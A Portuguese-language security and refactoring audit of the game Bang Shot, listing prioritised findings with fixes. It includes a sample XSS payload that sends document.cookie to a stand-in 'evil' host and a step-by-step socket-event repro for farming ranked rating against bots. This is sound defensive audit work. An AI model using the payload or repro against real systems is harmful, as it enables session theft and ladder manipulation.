# Auditoria de segurança + padrões OO + duplicação — Bang Shot (buckshotcopy) · 2026-07-17

> **Método:** varredura multi-agente (7 dimensões: authz/IDOR · injeção/segredos · economia/corrida · padrões-OO Regra 1 · transação/concorrência Regras 2-6 · duplicação→componente · regressão), cada achado passado por um **verificador adversarial** que tentou refutá-lo antes de entrar. Findings já conhecidos foram checados por regressão.
>
> **Placar global (3 jogos):** 76 sobreviveram (72 CONFIRMED, 4 PLAUSIBLE) · 9 refutados.
>
> **Este jogo:** 26 itens — P0=0 · P1=2 · P2=9 · P3=12.

## Resumo executivo (top 5)

- P1 — Fechar o farm de RANKED contra bots (game.handler.ts:347): decidir is_ranked SÓ no servidor (DEBUG só para admin; is_ranked=false com qualquer bot). É escalada de privilégio que corrompe a ladder e o leaderboard, explorável em loop sem oponente humano.
- P1 — Corrigir o double-credit do processGameEnd (achievement.service.ts:149 / game.persistence.service.ts:266): gatear/idempotenciar o crédito de achievements+win-streak dentro da transação do endGame. Dispara organicamente (perdedor sai na janela pós-gameOver) e dobra stats/streak, fake-unlockando milestones e títulos.
- P2 — Sanitizar o markdown com DOMPurify em ChangelogPage.tsx:108 e LegalPage.tsx:100. É XSS armazenado no domínio bangshot.mysys.* que rouba o token/cookie de sessão SSO de todos os jogadores.
- P2 — Endurecer a reconexão (room.service.ts:738 e via WaitingRoom :302-332): amarrar rejoin ao odUserId autenticado e trocar reconnectToken por crypto.randomBytes. Hoje um guest sequestra assento/host burlando a senha da sala só com nome+roomCode públicos.
- P2 — Montar authMiddleware (deny-by-default) fechando o IDOR público de /api/stats e adicionar checagem de posse no setActiveTitle (achievement.service.ts:597). Elimina rotas que sobem sem gate, o vazamento de stats e o spoof de títulos exclusivos no leaderboard público, e remove 6 cópias de auth ad-hoc.

## Achados priorizados (deduplicado)


### P1

#### Cliente controla gameMode/debugRankEnabled: qualquer usuário cria partida RANKED contra bots e farma ELO/LP/rank
- **Arquivo:** `src/server/src/socket/game.handler.ts:347`  ·  **Categoria:** authz-idor  ·  **Veredicto:** CONFIRMED
- **Impacto:** SINGLEPLAYER vs bots é deliberadamente não-ranked, mas o socket aceita createRoom {gameMode:'debug', debugRankEnabled:true} sem checar admin (adminMiddleware só cobre HTTP; socketUserMap não guarda flag de admin). addBot/startGame não checam ranked, então endGame grava is_ranked=true e credita ELO/LP/MMR/rank + leaderboard contra bots de risco zero (odUserId null). Farm ilimitado abrindo nova sala a cada vez; o gate de idempotência só barra creditar o MESMO jogo 2x. Corrompe a ladder ranqueada e o leaderboard público. O 'dev only' documentado em game.types.ts:14-15 nunca é imposto no servidor.
- **Correção:** Decidir is_ranked SÓ no servidor a partir de fatos verificados: DEBUG apenas para req.user.is_admin; forçar is_ranked=false sempre que houver participante bot (odUserId null / nome [BOT]); exigir todos humanos autenticados + mínimo de humanos + modo NORMAL. Nunca confiar em gameMode/debugRankEnabled do payload.

#### Double-credit de achievements/win-streak/stats vitalícios: processGameEnd roda fora do gate de idempotência do endGame (replay no fim de jogo)
- **Arquivo:** `src/server/src/services/achievement.service.ts:149`  ·  **Categoria:** idempotencia-atomicidade  ·  **Veredicto:** CONFIRMED
- **Impacto:** O gate atômico (claim.count===0) só protege as writes do endGame (XP/ELO/games_played/total_kills). processGameEnd roda FORA do gate e endGame retorna objeto truthy mesmo no no-op (game.persistence.service.ts:264-267), então os 2 call-sites (game.handler.ts:745, room.handler.ts:202) re-executam processGameEnd. Se o perdedor emite leaveRoom na janela ~2-3.5s pós-gameOver, onPlayerWonByDefault dispara endGame #2 e os increments incondicionais (achievement.service.ts:149-164) DOBRAM total_damage_dealt/total_live_hits/total_items_used/adrenaline/handcuff/info/sawed e best_win_streak (+2) para AMBOS os jogadores, fake-unlockando milestones (sniper/demolisher/item_hoarder/unbeatable) e title_perfectionist. Read-modify-write de streak sem lock/transação. Reproduzível sem script (perdedor clicar sair é orgânico). Mesmo vetor 'dois call-sites/replay' do P0 já documentado, residual na etapa não coberta. Refs: game.persistence.service.ts:266.
- **Correção:** No gate de replay (claim.count===0) retornar null/{finalized:false} e no handler só chamar processGameEnd quando finalized===true; OU mover processGameEnd para DENTRO da mesma transação/gate do endGame. Tornar os increments idempotentes por (game_id,user_id) derivando de GameParticipant/GameBadge (que já têm unique) e computar win-streak sob lock. Adicionar teste de replay/concorrência para processGameEnd (análogo a endgame-idempotency.test.ts).


### P2

#### XSS armazenado: marked() em dangerouslySetInnerHTML sem sanitização (changelog + legal)
- **Arquivo:** `src/client/src/pages/ChangelogPage/ChangelogPage.tsx:108`  ·  **Categoria:** injection-secrets  ·  **Veredicto:** CONFIRMED
- **Impacto:** entry.content vem da API do Games Admin (fetch ${ADMIN_API_URL}/api/games/${GAME_CODE}/changelog) e passa por marked() (v17, sem sanitização por padrão) e depois dangerouslySetInnerHTML. Não há DOMPurify no projeto (grep=0). HTML bruto embutido, ex.: <img src=x onerror=fetch('//evil?c='+document.cookie)>, executa no domínio bangshot.mysys.* para todos os jogadores, exfiltrando o token/cookie de sessão SSO. Mesmo padrão em LegalPage.tsx:100.
- **Correção:** Sanitizar com DOMPurify.sanitize(marked(content)) antes do dangerouslySetInnerHTML, ou configurar um renderer que escape HTML embutido. Aplicar nos dois pontos (ChangelogPage.tsx:108 e LegalPage.tsx:100).

#### Sequestro de assento/host via reconexão por playerName público + reconnectToken de Math.random (WaitingRoom nem exige token)
- **Arquivo:** `src/server/src/services/game/room.service.ts:738`  ·  **Categoria:** authz-idor  ·  **Veredicto:** CONFIRMED
- **Impacto:** playerName é campo livre controlado pelo cliente, nunca amarrado a user.display_name. Na WaitingRoom, joinRoom casa o jogador desconectado só por nome (room.service.ts:302-332) e RETORNA antes do check de senha (:384): um guest, com roomCode+hostName públicos (listRooms), assume o assento/host da vítima que deu F5 (janela 10s) BURLANDO a senha da sala usando só info pública. In-game, reconnectPlayer (:737-738) exige reconnectToken, mas ele é derivado de Math.random (:142-144, não-cripto); o hijack in-game completo é PLAUSIBLE (token não é broadcast), a via WaitingRoom sem token é CONFIRMED.
- **Correção:** Gerar reconnectToken com crypto.randomBytes e comparar em tempo constante; nunca autorizar reconexão/rejoin só por nome. Para autenticados, amarrar a reconexão ao odUserId do socket validado (usar rejoinByUserId) e remover o fallback name-only na WaitingRoom.

#### setActiveTitle grava título ativo sem verificar posse (IDOR de escrita; título forjado vaza no /api/auth/me e no leaderboard público)
- **Arquivo:** `src/server/src/services/achievement.service.ts:597`  ·  **Categoria:** authz-idor  ·  **Veredicto:** CONFIRMED
- **Impacto:** PUT /api/achievements/title aceita titleId arbitrário (ex.: title_champion, title_veteran, title_perfectionist) e executa prisma.user.update({active_title_id}) SEM checar user_titles (schema.prisma:59 é String? sem FK). getActiveTitle revalida na leitura do próprio perfil, MAS getUserProfile devolve active_title_id cru em /api/auth/me e /validate, e leaderboard.service.ts:118/195 devolve cru, então o título exclusivo falso aparece no leaderboard PÚBLICO (Leaderboard.tsx:203-213) para todos os jogadores. Spoof de prestígio sem custo. (Consolidado de 2 finders: P2 + P3.)
- **Correção:** Antes do update, exigir userTitle ativo {user_id, title_id} (ou titleId null); senão 400/403. Idealmente resolver o título exibido sempre via join com user_titles no getUserProfile e no leaderboard, em vez de confiar em user.active_title_id cru.

#### authMiddleware/optionalAuthMiddleware nunca montados: auth re-implementada em 5-6 controllers (rotas novas sobem sem proteção; drift com cookie SSO)
- **Arquivo:** `src/server/src/middleware/auth.middleware.ts:23`  ·  **Categoria:** authz-idor  ·  **Veredicto:** CONFIRMED
- **Impacto:** authMiddleware/adminMiddleware/optionalAuthMiddleware são dead code (0 usos; app.ts:97-121 monta os routers só com CORS/headers/cookie-parser). Cada controller re-implementa 'Bearer'->validateToken: getUserFromToken byte-idêntico em achievement.controller.ts:13 e history.controller.ts:13, + inline em bug.controller.ts:33 e leaderboard.controller.ts:26/:54 (6 cópias). Sem deny-by-default, uma rota nova esquece o gate e sobe pública, exatamente o que ocorreu com /api/stats. Drift REAL: auth.controller.extractToken aceita cookie httpOnly mysys_token, mas as cópias só leem header Bearer, então browser via cookie recebe 200 em /api/auth/me e 401 em /api/history, /api/achievements, /api/leaderboard/me. (Consolidado de 2 finders: P2 duplicação + P3 middleware.) Refs: achievement.controller.ts:13.
- **Correção:** Montar optionalAuthMiddleware (leitura pública com user opcional) e authMiddleware (rotas privadas) nas routes de achievement/history/leaderboard/bug/stats; controllers leem req.user.id. Adotar deny-by-default: auth explícita e rotas públicas marcadas conscientemente. Remover getUserFromToken duplicado e os blocos inline.

#### getUserRankAllTime carrega TODOS os usuários ativos em memória e ordena em JS a cada request de leaderboard all_time
- **Arquivo:** `src/server/src/services/leaderboard.service.ts:136`  ·  **Categoria:** leitura-quente-sem-limite  ·  **Veredicto:** CONFIRMED
- **Impacto:** GET /api/leaderboard?period=all_time (ou /me) com token chama getUserRankAllTime, que faz prisma.user.findMany({where:{games_played>0}}) SEM take e JS-sort de toda a base só para achar a posição de 1 usuário. games_played não tem índice (seq scan). Sem rate-limit (0 matches em src/server), qualquer usuário aciona em loop uma leitura O(N) da tabela users por request, DoS de custo/memória crescendo com a base. Reforço: getAllTimeLeaderboard usa take:limit*3 e limit vem de parseInt(req.query.limit) sem clamp num ramo SEM token, então ?limit=99999999 força take ~3e8.
- **Correção:** Calcular o rank via COUNT no banco usando o índice composto @@index([tier,division,lp]) (contar quantos têm chave-de-ranking melhor); ou manter uma coluna de rank denormalizada atualizada no endGame. Clampar o limit (ex.: máx 100).

#### recalculateTitles() dispara ~11 agregações por ended_at SEM índice a cada fim de jogo (hot path)
- **Arquivo:** `src/server/src/services/achievement.service.ts:182`  ·  **Categoria:** leitura-quente-sem-indice  ·  **Veredicto:** CONFIRMED
- **Impacto:** recalculateTitles roda fire-and-forget ao fim de CADA partida (processGameEnd:182, único caller, sem await/throttle/gate por isRanked) e executa ~11 SELECTs; 4 fazem JOIN GameParticipant×Game filtrado por g.ended_at>=X AND <Y + GROUP BY gp.user_id. O model Game (schema.prisma:155-160) indexa status/room_code/created_at/winner_id, NÃO ended_at, então cada fim de jogo dispara 4 full-scans por coluna não indexada, custo O(total de partidas no período), no caminho crítico de encerramento. N partidas/min terminando junto multiplica CPU/lock-wait no MySQL.
- **Correção:** Adicionar índice em Game.ended_at (ou composto status+ended_at); tirar o recálculo do fim-de-jogo para um job agendado/debounced por período (não 1x/partida); considerar materializar os rankings de título.

#### Lógica de itens duplicada e divergente: itemProcessor puro (port) está MORTO enquanto game.service.processItem reimplementa tudo num switch de ~217 linhas
- **Arquivo:** `src/server/src/services/game/game.service.ts:507`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** src/shared/services/itemProcessor.ts (validateItemUse + processItemEffect, domínio puro sem mutação) NÃO é importado por server nem client (só re-export em shared/index.ts) — dead code. O caminho autoritativo real (game.service.processItem:507-724, chamado por game.handler.ts:163 e bot.service.ts:711) muta room.shells/hp/items in-place num switch gigante intercalado com stats. As duas já DIVERGEM: para 'phone', o port recusa revelar quando só resta o cartucho atual (itemProcessor.ts:108), mas game.service revela QUALQUER posição inclusive já disparada (:576-591). A versão pura/testável apodrece e a regra viva fica acoplada e sem testes.
- **Correção:** Fazer game.service.processItem consumir processItemEffect(itemId, context) do itemProcessor e aplicar o ItemEffect retornado num único applyEffect ao Room; eliminar o switch duplicado. A regra de item vira domínio puro e ganha os testes que hoje não rodam.

#### Handler de socket gordo: handleRoundEnd (~223 linhas) e useItem embutem regra + Prisma + achievements + broadcast; sequência advance-turn copiada 5x
- **Arquivo:** `src/server/src/socket/game.handler.ts:615`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** handleRoundEnd (615-837) mistura inline regra (checkGameEnd), montagem de DTO de stats, persistência Prisma (endRound/endGame/saveRound), calculateAwards, endMatchSession, processGameEnd e broadcast; o 1º parâmetro é io:TypedIOServer com emits diretos, impossível testar/reusar headless. A sequência advanceTurn->clearTimeout/setTimeout(turnTimeout)->emit turnChanged->scheduleBotTurn está copiada 5x (useItem:206/256/295, shoot:89, timeout:891) e JÁ divergiu (delays 3000 vs 3500; reasons diferentes; args de advanceTurn variam), fonte de bugs de sincronização.
- **Correção:** Extrair um GameFlowOrchestrator/RoundCoordinator de domínio com port de broadcast e port de persistência (outbox); o handler só traduz evento->comando e comando->emit. Unificar advanceTurn+timer+bot num único método reutilizável.

#### Ausência de DTO compartilhado: Player/PlayerStats/Room definidos 3x e costurados com 25 casts `as never` no núcleo do jogo
- **Arquivo:** `src/server/src/socket/game.handler.ts:479`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** PlayerStats (33 campos), Player e Room são redeclarados em game.service.ts, room.service.ts e game.handler.ts e reconstruídos campo-a-campo em 3 lugares sem factory. 25 casts `as never` (15 game.handler / 9 bot.service / 1 room.handler) nos pontos críticos (checkGameEnd/startRound/processShot/advanceTurn/scheduleBotTurn) desligam a checagem de tipos exatamente onde a regra roda. Os tipos já divergiram (room.service Player tem odUserId que game.service não tem; Room tem gameMode/debugRankEnabled só numa cópia), então renomear um campo em uma cópia não gera erro nas outras -> bug silencioso latente. Não há crash de runtime atual (o mesmo objeto completo flui), é erosão de type-safety.
- **Correção:** Definir Player/PlayerStats/Room uma única vez em src/shared/types (DTO/value-objects) e importar em todos os serviços/handlers; remover todos os `as never`. Qualquer incompatibilidade restante é bug real que o compilador deve apontar.


### P3

#### Rotas /api/stats/:userId e /api/stats/od/:odUserId sem autenticação: IDOR de leitura + enumeração/correlação cross-game do odUserId
- **Arquivo:** `src/server/src/routes/stats.routes.ts:14`  ·  **Categoria:** authz-idor  ·  **Veredicto:** CONFIRMED
- **Impacto:** app.ts:118 monta /api/stats sem middleware e nenhum handler checa token/ownership. Sem token: GET /api/leaderboard dá user_ids públicos -> GET /api/stats/<user_id> retorna stats completas de qualquer usuário; GET /api/stats/od/<game_user_id> mapeia o odUserId (identidade compartilhada do Portal entre jogos, @unique) para user.id interno + stats, virando oráculo de existência/correlação cross-game. Dados de baixa sensibilidade, mas broken access control real. É a manifestação concreta do item 'auth middleware não montado'.
- **Correção:** Aplicar authMiddleware em /api/stats e derivar o id do token para stats próprias (como history/achievement). Se stats de terceiros forem intencionalmente públicas, expor via recurso público explícito (não pelo id interno/odUserId) + rate-limit contra enumeração.

#### God Object: RoomService (1227 LOC) acumula estado em memória, event-bus por callbacks, timers, serialização e rematch
- **Arquivo:** `src/server/src/services/game/room.service.ts:112`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** Uma classe de 1227 LOC concentra (a) fonte-da-verdade em memória (Map<Room> + rematchRooms), (b) event-bus ad-hoc por 10 callbacks on* opcionais, (c) timers setTimeout espalhados (emptyRoom/grace/checkReconnect/rematch-cleanup), (d) serialização/restauração DB (serializeRoomState/restoreRoomFromState), (e) rematch tracking, (f) todo o ciclo de reconexão, ~28 métodos. Impossível testar regra de sala sem carregar timers/serialização; o estado em memória torna o processo stateful e não-escalável horizontalmente. (Parte do impacto original — '11 callbacks' — corrigida para 10.)
- **Correção:** Separar em RoomRepository (estado: Map->Redis), RoomLifecycle/ReconnectionService (timers/grace), RoomEventEmitter tipado (substituir os 10 callbacks por observer com contrato) e RoomSerializer. Regra de sala pura atrás de ports.

#### AchievementService (940 LOC): badges/milestones/títulos acoplados a Prisma e a SQL cru via $queryRawUnsafe com datas interpoladas
- **Arquivo:** `src/server/src/services/achievement.service.ts:841`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** Serviço God concentra badges (computeBadges, ~20 ifs), milestones (map conditions:230-264) e títulos periódicos, tudo intercalado com prisma.create/updateMany e, nos títulos, SQL montado por concatenação de string via $queryRawUnsafe (:841/:849/:883/:888) com datas via formatDateForSQL (:934). Limiares de badge/milestone/título não são testáveis sem banco real; regras de negócio (games_played>=5, elo_gain>0, status='COMPLETED') vivem dentro do texto SQL. As datas são Date internas (baixo risco de injeção hoje), mas o padrão é frágil e deveria usar parâmetros.
- **Correção:** Extrair BadgeRules/MilestoneRules/TitleRules puros (entrada = stats agregadas, saída = ids concedidos), testáveis sem DB; o service só persiste. Trocar $queryRawUnsafe+interpolação por $queryRaw parametrizado ou agregações do Prisma.

#### processShot mistura regra de tiro (dano/eliminação/fim de round) com ~48 linhas de tracking de achievements
- **Arquivo:** `src/server/src/services/game/game.service.ts:374`  ·  **Categoria:** pattern-oo  ·  **Veredicto:** CONFIRMED
- **Impacto:** A regra central de tiro (calcular dano, aplicar hp, marcar morte, detectar fim de round; game.service.ts:336-467) está entrelaçada com contadores de achievement (liveHits/liveHitsInGame/damageDealt/sawedShots/firstBloodInGame/allShotsLiveInGame/killsInCurrentRound...). Mesmo padrão em startRound (init de 30+ campos inline), checkRoundEnd e checkGameEnd. Mistura de responsabilidades dificulta leitura e teste isolado das duas coisas.
- **Correção:** Emitir eventos de domínio (ShotFired/PlayerKilled/RoundWon) e ter um StatsTracker/AchievementCollector separado que assina esses eventos e acumula contadores, mantendo processShot focado só na regra de tiro.

#### getRankFromElo triplicado com thresholds DIVERGENTES (cliente x shared/servidor) — impacto de UI refutado (cópia do cliente é dead code)
- **Arquivo:** `src/client/src/utils/helpers.ts:78`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** A regra ELO->tier existe 3x: client helpers.ts:78 (2500/2200/1900/1600/1300/1000), shared/utils/eloCalculator.ts:355 (2400/2100/.../900) e auth.service.ts:410 calculateRank (cópia byte-a-byte do shared, apesar de o servidor já importar o shared getRankFromElo em game.persistence.service.ts:11). O impacto de 'front não bate com back' está REFUTADO: o getRankFromElo do cliente tem 0 call-sites (a UI mostra user.tier persistido). Fica como código morto no cliente + duplicação redundante no servidor.
- **Correção:** Eleger shared/utils/eloCalculator.getRankFromElo como fonte única. Deletar client helpers.ts:getRankFromElo (o barrel utils/index.ts passa a reexportar do shared) e o método privado auth.service.calculateRank, usando o import do shared.

#### Linha de leaderboard e avatar-com-fallback duplicados entre Leaderboard e MiniLeaderboard (+ interface e fetch)
- **Arquivo:** `src/client/src/pages/Leaderboard/Leaderboard.tsx:189`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** LeaderboardEntry é redefinida com shapes divergentes (Leaderboard.tsx:27-45, 13 campos vs MiniLeaderboard.tsx:11-21, 9 campos); o fetch de /api/leaderboard é duplicado (Leaderboard:66 vs MiniLeaderboard:31, cada um com seu useEffect/useState/loading); o bloco avatar-com-inicial-de-fallback está duplicado e JÁ DIVERGENTE (Leaderboard:189 texto solto classe entry-avatar vs MiniLeaderboard:81 <span> guardado classe leaderboard-entry__avatar). O escopo '4 arquivos' foi refutado: WaitingRoom/PlayerCard só compartilham o idiom charAt(0) sem ramo de <img>.
- **Correção:** Criar <PlayerAvatar name avatarUrl size/> e <LeaderboardRow entry/> reutilizáveis; mover LeaderboardEntry para @shared/types e um useLeaderboard/leaderboardApi compartilhado. As duas telas passam a compor os mesmos componentes.

#### Mapper snake_case->camelCase de partida duplicado 3x dentro do history.controller
- **Arquivo:** `src/server/src/controllers/history.controller.ts:45`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** O bloco de ~18 campos (roomCode/damageDealt/eloChange/lpChange/xpEarned...) é remapeado idêntico em getUserHistory:46-63 e getGameDetails:131-148, + 3ª cópia parcial (11 campos) em participants.map:153-169. Não há helper compartilhado. res.json() com object literal não acusa propriedade faltando, então adicionar/renomear um campo e esquecer um bloco derruba o dado silenciosamente da resposta desse endpoint.
- **Correção:** Extrair mapGameSummaryToDto(game) e mapParticipantToDto(p) (ou um camelizeGame) num serializer compartilhado (services/history.serializer.ts) e chamar nos dois handlers. Fonte única do contrato de saída.

#### Máquina de estados de fetch do changelog copy-paste entre Changelog e ChangelogPage
- **Arquivo:** `src/client/src/components/home/Changelog/Changelog.tsx:30`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** fetchChangelog (loading/error/empty + tratamento de !ok) é byte-a-byte idêntico em Changelog.tsx:30-60 e ChangelogPage.tsx:29-59, diferindo só no limit (3 vs 20). Também duplicam a interface ChangelogEntry, o trio de useState, o useEffect e o handler de retry. Correções (retry/timeout/nova forma do payload) precisam ser feitas em dois lugares.
- **Correção:** Extrair um hook useChangelog(limit) que devolve {entries, loading, error, reload}; os dois componentes ficam só com a apresentação.

#### getRankIcon reimplementado inline no MiniLeaderboard apesar de existir em utils/helpers
- **Arquivo:** `src/client/src/components/home/MiniLeaderboard/MiniLeaderboard.tsx:46`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** utils/helpers.ts:26 exporta getRankIcon (medalhas/#rank), importado por Leaderboard.tsx:13, mas MiniLeaderboard.tsx:46 redefine a mesma lógica inline (e já importa getRankColor do MESMO módulo). Duas fontes da mesma verdade: trocar o esquema de ícones (emoji->SVG) atualiza Leaderboard mas não o MiniLeaderboard.
- **Correção:** Deletar o getRankIcon local e importar { getRankIcon } de '../../../utils/helpers' (mesma linha do getRankColor já importado).

#### Constantes GAME_CODE/ADMIN_API_URL redeclaradas em múltiplos arquivos com defaults divergentes
- **Arquivo:** `src/client/src/components/home/Changelog/Changelog.tsx:18`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** config/index.ts já exporta GAME_CODE (default 'BANGSHOT') e ADMIN_API_URL (default ''), mas são redeclarados em Changelog.tsx:18, AdsContext.tsx:64, AuthContext.tsx:45 e AdBanner.tsx:135. O default de ADMIN_API_URL diverge: '' (Changelog) vs 'https://admin.mysys.shop' (AdsContext), então no mesmo build sem VITE_ADMIN_API_URL o Changelog curto-circuita ('API não configurada') enquanto o AdsContext dispara request pra API de produção. Mesmo conceito, dois comportamentos.
- **Correção:** Importar GAME_CODE e ADMIN_API_URL de src/config em todos os consumidores; remover as redeclarações locais e alinhar o default único.

#### Scaffold de binding de eventos Socket.IO duplicado em 3 hooks (risco de leak por off assimétrico)
- **Arquivo:** `src/client/src/hooks/multiplayer/useRoomEvents.ts:64`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** useRoomEvents/useLobbyEvents/useGameEvents repetem o mesmo esqueleto (handlersRef + wrapper por evento 'const handleX = d => handlersRef.current.onX?.(d)' + socket.on espelhado por socket.off), 43 usos de handlersRef.current. Cada lista on/off é mantida à mão, então é fácil esquecer um socket.off no cleanup (memory leak / handler duplicado). Não há helper compartilhado.
- **Correção:** Extrair um useSocketEvents(socket, handlerMap: Record<string,(payload)=>void>) genérico que registra e faz cleanup de todos os pares on/off garantindo simetria; cada hook de domínio passa só o mapa evento->handler.

#### Wrapper <svg> idêntico copiado em ~100-130 arquivos de ícone (duas convenções de a11y coexistem)
- **Arquivo:** `src/client/src/components/icons/ui/BugIcon.tsx:6`  ·  **Categoria:** duplication-componentization  ·  **Veredicto:** CONFIRMED
- **Impacto:** Icon.tsx só exporta IconProps/getIconSize/DEFAULT_ICON_COLOR/ICON_SIZES — não há componente-wrapper, então o boilerplate <svg width/height/viewBox/fill/aria-hidden/role + {title && <title>}> está copiado em 101 de 128 ícones. Já há divergência real: os 25 ícones de achievements (ex.: SniperIcon.tsx:8) usam outra família (viewBox 0 0 48 48, fill='none', aria-label sem <title>/role/aria-hidden, cor hardcoded #ef4444). Mudar a11y/viewBox/title exige editar ~100 arquivos. (O exemplo literal 'stroke=currentColor' do finder não existe; a divergência real é a família achievements.)
- **Correção:** Criar um <SvgIcon {...iconProps}>{children}</SvgIcon> base (ou HOC createIcon(paths)) que centraliza o wrapper; cada ícone passa só os elementos internos. Unificar as duas convenções de a11y.


## Plano de componentização / refatoração

As duplicações se concentram em dois eixos. NO BACKEND, a raiz é a ausência de fronteiras/ports: (1) a extração de token JWT ('Bearer'->validateToken) está copiada em 6 lugares (getUserFromToken byte-idêntico em achievement/history.controller + inline em bug e leaderboard×2) apesar de já existir authMiddleware/optionalAuthMiddleware não montados — montar esses middlewares nas routes e ler req.user.id em todos os handlers elimina as 6 cópias, fecha o IDOR público de /api/stats e mata o drift do cookie SSO; (2) Player/PlayerStats/Room definidos 3x e costurados por 25 `as never` — mover para src/shared/types como DTOs únicos remove os casts e devolve type-safety ao núcleo; (3) o itemProcessor puro (validateItemUse/processItemEffect) está morto enquanto game.service.processItem reimplementa um switch de ~217 linhas divergente — reviver o port e consumi-lo num único applyEffect deleta o switch; (4) getRankFromElo triplicado -> fonte única em shared/eloCalculator, deletando a cópia do cliente (dead code) e auth.service.calculateRank; (5) o mapper snake->camel de partida (3 blocos em history.controller) vira um history.serializer (mapGameSummaryToDto/mapParticipantToDto); e, como refactor estrutural maior, extrair BadgeRules/MilestoneRules/TitleRules de AchievementService e um GameFlowOrchestrator/RoundCoordinator do handler gordo, unificando as 5 cópias da sequência advanceTurn+timer+bot. NO FRONTEND, extrair: um hook useChangelog(limit) (funde as 2 cópias byte-a-byte de fetch), os componentes <PlayerAvatar> e <LeaderboardRow> + tipo LeaderboardEntry em @shared/types + useLeaderboard (unifica Leaderboard e MiniLeaderboard, hoje com classes e shapes divergentes), importar getRankIcon de utils/helpers (deletando a cópia inline do MiniLeaderboard), importar GAME_CODE/ADMIN_API_URL de src/config em todos os consumidores (removendo 4 redeclarações com defaults inconsistentes), um hook genérico useSocketEvents(socket, handlerMap) que garante simetria on/off nos 3 hooks de multiplayer, e um componente base <SvgIcon> (ou HOC createIcon) que absorve o wrapper <svg> copiado em ~100 ícones e reconcilia as duas convenções de a11y. Em todos os casos a abstração-alvo já existe parcialmente (config, Icon.tsx, auth.middleware.ts, itemProcessor, eloCalculator), então o trabalho é ligar os consumidores à fonte única e apagar as cópias.

---

## Apêndice — provas (repro/evidência por achado bruto)

### [P1] Cliente controla gameMode/debugRankEnabled: qualquer usuario cria partida RANKED contra bots e farma ELO/LP/rank
- `src/server/src/socket/game.handler.ts:347` · authz-idor · **CONFIRMED**
- **Evidência:** room.handler.ts createRoom (linhas 338-347): recebe do cliente `{ playerName, password, gameMode, debugRankEnabled }` e faz `const mode: GameMode = gameMode || GameMode.NORMAL; const rankEnabled = mode === GameMode.DEBUG ? (debugRankEnabled || false) : false;` SEM nenhum gate de admin/dev. Isso vira is_ranked em game.persistence.service.ts:95 `const isRanked = gameMode === GameMode.NORMAL || (gameMode === GameMode.DEBUG && params.debugRankEnabled);`. E bot.service.addBotToRoom NAO tem checagem de ranked, e room.service.startGame so valida `room.players.length < GAME_RULES.MIN_PLAYERS` (bots contam).
- **Repro/verificação:** Cadeia 100% alcançável e autoritativa no servidor (socket é a autoridade; o gate "admin only" da Debug page é só comentário/rota do cliente). Nenhum handler de socket checa is_admin — o socketUserMap (socket.ts:102) guarda só {odUserId, displayName, token}, sem flag de admin; adminMiddleware (auth.middleware.ts:59-71) só cobre rotas HTTP, não eventos socket.

Repro (qualquer usuário autenticado, emitindo eventos socket.io crus):
1. Conectar com token válido de qualquer conta registrada -> socketUserMap tem odUserId.
2. emit('createRoom', { playerName:'x', gameMode:'debug', debugRankEnabled:true }). room.handler.ts:346-347 -> mode=DEBUG, rankEnabled=true (SEM checagem de admin/dev). createGame -> game.persistence.service.ts:95 -> isRanked = (DEBUG && true) = true. Linha Game gravada com is_ranked=true.
3. emit('addBot', { botName:'b', difficulty:'easy' }). room.handler.ts:963-988: só valida room.host===socket.id (o atacante É o host da própria sala); addBotToRoom (bot.service.ts:74-95) só checa sala existe / não iniciada / < MAX_PLAYERS(4). Bot entra com odUserId:null (linha 118). Sala fica com 2 players. Sem checagem de ranked/modo.
4. emit('startGame'). room.service.ts:521-533: só valida host e players.length(2) >= MIN_PLAYERS(2) — bots contam. Inicia.
5. Jogar e vencer o bot. handleRoundEnd -> checkGameEnd -> endGame({winnerUserId: seuId}). persistence:232 isRankedGame = existingGame.is_ranked = true -> ramo 366: calculatePerformanceBasedElo + calculateLpChange; tx.user.update (461-487) grava elo_rating/rank/tier/division/lp/mmr_hidden/peak_mmr e games_won+1; leaderboardService.updatePlayerStats(...tx) (493-503) atualiza o leaderboard. Bot (user_id null) cai no ramo guest (535-561): sem ELO, lido como ELO/MMR 0.
Repetir com sala nova a cada vez (novo room_code) -> farm ilimitado de ELO/LP/rank/leaderboard contra oponente de risco zero. O gate de idempotência (255-267) só barra creditar o MESMO jogo 2x; não impede N jogos debug-ranked distintos.

Viola explicitamente a intenção documentada em game.types.ts:14-15 (SINGLEPLAYER vs bots = SEM rank; toggle de rank do DEBUG = "dev only for testing"). O "dev only" nunca é imposto no servidor.
- **Notas do verificador:** Confirmado sem margem por leitura de código. Ponto do autor sobre arquivo/linha está levemente trocado (o createRoom real está em room.handler.ts:338-347, não game.handler.ts:347), mas o mecanismo, as linhas de persistência (95, 232, 366, 461-503) e o impacto estão corretos. Observação que AMPLIA o achado: o handler addBot não restringe por modo — só checa host — então bots também entram em sala NORMAL (is_ranked=true por padrão). Ou seja, nem o flag debug é estritamente necessário: NORMAL + addBot já farma rank contra bots; a variante DEBUG+debugRankEnabled é só a demonstração mais limpa do bypass do design 'não-ranked contra bots'. Magnitude do ganho por jogo pode ser pequena (bots ELO/MMR 0 => baixo ganho esperado no ELO legado), mas games_won/leaderboard incrementam sempre e o novo sistema de LP credita posição 1; repetível sem risco corrompe a ladder. Mantenho P1 (broken access control / privilege escalation com impacto de integridade no sistema ranqueado, trivial e repetível por qualquer autenticado). Não é P0 (sem RCE/PII/financeiro). Correção: gate server-side de is_admin no createRoom quando gameMode===DEBUG (e propagar is_admin pro socketUserMap), e/ou forçar is_ranked=false sempre que a sala contiver qualquer player com odUserId:null (bot) e/ou restringir addBot ao modo SINGLEPLAYER no servidor.

